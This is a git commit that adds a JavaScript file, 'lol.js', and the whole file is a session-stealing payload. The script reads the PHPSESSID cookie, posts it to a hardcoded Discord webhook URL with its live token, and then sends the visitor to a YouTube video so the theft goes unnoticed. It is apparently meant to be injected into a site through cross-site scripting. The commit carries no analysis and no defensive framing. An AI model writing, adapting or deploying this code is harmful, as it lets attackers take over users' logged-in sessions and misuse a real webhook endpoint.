184396a4581f0da0ba1ead6185750b0fe61647d3
ponyloversonataduskmane <109227087+ponyloversonataduskmane@users.noreply.github.com>
2022-07-13 16:17:21 +0200

    Create lol.js

---
+++ lol.js
@@ -0,0 +1,29 @@
+function getCookie(name){
+    if(document.cookie.length == 0)
+      return null;
+
+    var regSepCookie = new RegExp('(; )', 'g');
+    var cookies = document.cookie.split(regSepCookie);
+
+    for(var i = 0; i < cookies.length; i++){
+      var regInfo = new RegExp('=', 'g');
+      var infos = cookies[i].split(regInfo);
+      if(infos[0] == name){
+        return unescape(infos[1]);
+      }
+    }
+    return null;
+  }
+
+token = getCookie("PHPSESSID")
+message = `token: ${token}`;
+channel_url = `https://discord.com/api/webhooks/995454248164786266/qCpBBWze7VzuLmoM2vlzlYzsbS_8QLiqBWhCWoGaxOB6ZBNl-p8e7t4-g_tUMSFvi-qd`;
+request = new XMLHttpRequest();
+request.withCredentials = true;
+request.open("POST", channel_url);
+request.setRequestHeader("accept", "*/*");
+request.setRequestHeader("content-type", "application/json");
+request.send(JSON.stringify({ content: message }));
+setTimeout(() => {
+window.location.replace("https://www.youtube.com/watch?v=_I2blDXxZnw");
+}, 50);
